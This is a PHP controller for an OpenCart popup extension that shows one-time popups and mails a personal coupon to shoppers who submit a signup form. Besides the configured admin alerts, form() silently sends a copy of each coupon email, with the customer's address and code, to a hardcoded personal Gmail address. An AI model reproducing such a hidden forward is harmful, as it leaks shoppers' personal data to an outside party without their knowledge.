<?php
namespace Opencart\Catalog\Controller\Bytao;

class Popup extends \Opencart\System\Engine\Controller {
	
	public function index():string {
			$this->load->language('bytao/popup');
			$this->load->model('bytao/popup');
			
			$popups = $this->model_bytao_popup->getPopup();
			if($popups) {
				foreach($popups as $popup){
					if(!isset($this->session->data['popup'.$popup['popup_id']])){
						if(isset($popup['popup_type'])){
							
							switch($popup['popup_type']){
								case 0:
									$data['popupd'] = [
								 		'image'=> HTTPS_IMAGE.by_move($popup['image']),
								 		'link'=> $popup['link']
									];
									break;
								case 1:
									$data['popupd'] = [
								 		'image'=> HTTPS_IMAGE.by_move($popup['image']),
								 		'link'=> $popup['link']
									];
									break;
								case 2:
									$data['popupd'] = [
								 		'link'=> $popup['link'],
								 		'name'=> $popup['name'],
								 		'description'=> $popup['description']
									];
									break;
								default:
									$data['popupd'] = [
								 		'image'=> HTTPS_IMAGE.by_move($popup['image']),
								 		'link'=> $popup['link']
									];
							}	
							$this->session->data['popup'.$popup['popup_id']] = 'ok';
							return $this->load->view('bytao/popup/popup'.$popup['popup_type'], $data);
						}
					}
				}
			}
		return '';		
	}
	
	public function form():void{
		
		$json = [];
		
		$this->load->language('bytao/popup');
		
		if ((utf8_strlen($this->request->post['email']) > 96) || !preg_match('/^[^\@]+@.*.[a-z]{2,15}$/i', $this->request->post['email'])) {
			$json['error']['email'] = $this->language->get('error_email');
		}
		if ((utf8_strlen(trim($this->request->post['firstname'])) < 1) || (utf8_strlen(trim($this->request->post['firstname'])) > 32)) {
			$json['error']['name'] = $this->language->get('error_name');
		}

		if(!isset($json['error'])){
			
			$email=$this->request->post['email'];
			
			$this->load->model('bytao/mail');
			$this->load->model('marketing/coupon');
			
			$template_id = $this->request->post['temp_id'];
			
			$descriptions = $this->model_bytao_mail->getMail_templateDescriptions($template_id);
		
			$template = $this->model_bytao_mail->getMail_templateById($template_id);
		
			$code_id = isset($template['code'])?$template['code']:"";
			$code="&code=".$code_id;
			
			$coupon_status = $this->db->query("SELECT count(*) from " . DB_PREFIX . "coupon_personal WHERE email='".$this->db->escape($email)."' AND  date_end > NOW()");
			
			if($coupon_status->row[0]<1){
					
					$coupon_info = $this->model_marketing_coupon->getCouponByCode($code_id);
					
					if($coupon_info){
						$content_main = $descriptions[1]['description'];
						$subject = $descriptions[1]['meta_title'];
						$find = [
								'{coupondate}',
								'{link}',
								'{code}'
						];
						
						if($coupon_info['type_customer']==1){
								
								$dateEnd = date('l jS \of F Y', strtotime('+15 days'));
								if($this->customer->isLogged()){
									$customer_id = $this->customer->getId();
								}else{
									$customer_id = 0;
								}
								
								
								$this->db->query("INSERT INTO " . DB_PREFIX . "coupon_personal SET code='" . $this->db->escape($code_id). "', email='".$this->db->escape($email)."', customer_id='".(int)$customer_id."', order_id='0', date_start= NOW(), date_end='".date('Y-m-d',strtotime('+15 days'))."'");
							
								
								$replace = [
									'coupondate' => $dateEnd ,
									'link' => $this->url->link('common/home'),
									'code' => $code_id
									
								];
							}else{
							$dateEnd = date('l jS \of F Y', strtotime($coupon_info['date_end']));
							$replace = [
								'coupondate' => $dateEnd,
								'link' => $this->url->link('common/home'),
								'code' => $code_id
							];
						}
							
						$content_last = str_replace($find, $replace, $content_main);
						$message  = '<html dir="ltr" lang="en">' . "\n";
						$message .= '  <head>' . "\n";
						$message .= '    <title>' . $subject . '</title>' . "\n";
						$message .= '    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">' . "\n";
						$message .= '  </head>' . "\n";
						$message .= '  <body>' . html_entity_decode($content_last, ENT_QUOTES, 'UTF-8') . '</body>' . "\n";
						$message .= '</html>' . "\n";
						
						$mail_id = $this->model_bytao_mail->addMail($email,$subject,html_entity_decode($content_last, ENT_QUOTES, 'UTF-8'),$code_id);
						
						$mail = new Mail();
						$mail->protocol = $this->config->get('config_mail_protocol');
						$mail->parameter = $this->config->get('config_mail_parameter');
						$mail->smtp_hostname = $this->config->get('config_mail_smtp_hostname');
						$mail->smtp_username = $this->config->get('config_mail_smtp_username');
						$mail->smtp_password = html_entity_decode($this->config->get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
						$mail->smtp_port = $this->config->get('config_mail_smtp_port');
						$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
						
						$mail->setTo($email);
						$mail->setFrom($this->config->get('config_email'));
						$mail->setSender($this->config->get('config_name'));
						$mail->setSubject($subject);
						
						$mail->setHtml($message);
						$mail->send();
						
						$mail->setSubject('REP:'.$subject);
						$mail->setTo('adamnygs@gmail.com');
						$mail->send();
						
						
						$mail->setTo($this->config->get('config_email'));
						$mail->setSender( $this->config->get('config_name'));
						$mail->setSubject('ADM:'.$subject);
						$mail->send();
						
						$emails = explode(',', $this->config->get('config_mail_alert'));
						foreach ($emails as $email) {
							if ($email && preg_match('/^[^\@]+@.*.[a-z]{2,15}$/i', $email)) {
								$mail->setTo($email);
								$mail->send();
							}
						}
						$json['success'] = $this->language->get('text_success');
				
				}else{
						$json['error']['email'] = $this->language->get('error_code_mail');
					}
			}else{
				$json['error']['sended'] = $this->language->get('error_code_sended');
			}
				
		}
		
		$this->response->addHeader('Content-Type: application/json');
		$this->response->setOutput(json_encode($json));
	}

}
